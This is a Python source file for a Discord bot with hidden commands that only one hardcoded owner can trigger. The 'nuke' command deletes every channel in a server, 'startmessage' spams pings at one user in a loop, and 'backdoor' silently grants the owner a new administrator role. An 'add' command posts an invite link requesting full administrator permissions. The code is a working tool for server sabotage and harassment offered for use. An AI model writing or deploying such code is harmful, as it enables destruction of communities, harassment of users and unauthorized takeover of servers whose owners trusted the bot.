import os
import asyncio
import time
import discord
from discord.ext import commands
from discord import ui

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_NAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= CHECK =================
def allowed(user):
    return user.id == OWNER_ID and user.name == OWNER_NAME

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not allowed(ctx.author):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`\n"
        "`$sudo nuke now`\n"
        "`$sudo backdoor`\n"
        "`$sudo add`"
    )

# ================= NUKE =================
@sudo.command(name="nuke")
async def sudo_nuke(ctx, key: str = None):
    if not allowed(ctx.author):
        return
    if key != "now":
        return

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete(reason="sudo nuke")
        except (discord.Forbidden, discord.HTTPException):
            pass

# ================= SPAM LOOP =================
async def spam_loop(channel):
    try:
        while True:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task
    if not allowed(ctx.author):
        return
    if spam_task and not spam_task.done():
        return
    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")

# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task
    if not allowed(ctx.author):
        return
    if not spam_task:
        return
    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")

# ================= ADD =================
@sudo.command(name="add")
async def sudo_add(ctx):
    await ctx.send(
        "https://discord.com/oauth2/authorize"
        "?client_id=1470802191139864659"
        "&permissions=8"
        "&integration_type=0"
        "&scope=bot+applications.commands"
    )

# ================= BACKDOOR =================
@sudo.command(name="backdoor")
async def sudo_backdoor(ctx):
    if not allowed(ctx.author):
        return

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    guild = ctx.guild
    member = ctx.author
    role_name = "Backdoored"

    role = discord.utils.get(guild.roles, name=role_name)
    if role is None:
        role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions(administrator=True),
            reason="sudo backdoor"
        )

    if role not in member.roles:
        await member.add_roles(role, reason="sudo backdoor")

    try:
        await member.send(f"✅ Backdoor role applied in **{guild.name}**.")
    except discord.Forbidden:
        pass

# ================= UNBAN REQUEST BUTTON =================
class UnbanRequestView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="🔓 Request Unban", style=discord.ButtonStyle.primary)
    async def request_unban(self, interaction: discord.Interaction, button: ui.Button):
        if not allowed(interaction.user):
            await interaction.response.defer()
            return

        await interaction.response.send_message(
            "📨 Unban request sent.", ephemeral=True
        )

# ================= ANTI-BAN ALERT =================
@bot.event
async def on_member_ban(guild, user):
    if not allowed(user):
        return

    embed = discord.Embed(
        title="🚨 You were banned",
        description=(
            f"**Server:** {guild.name}\n"
            f"**Server ID:** `{guild.id}`\n\n"
            "You may request an unban below."
        ),
        color=discord.Color.red()
    )

    try:
        await user.send(
            embed=embed,
            view=UnbanRequestView()
        )
    except discord.Forbidden:
        pass

# ================= MESSAGE HANDLER =================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    await bot.process_commands(message)

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set")

time.sleep(10)  # Railway / rate-limit safety
bot.run(TOKEN)
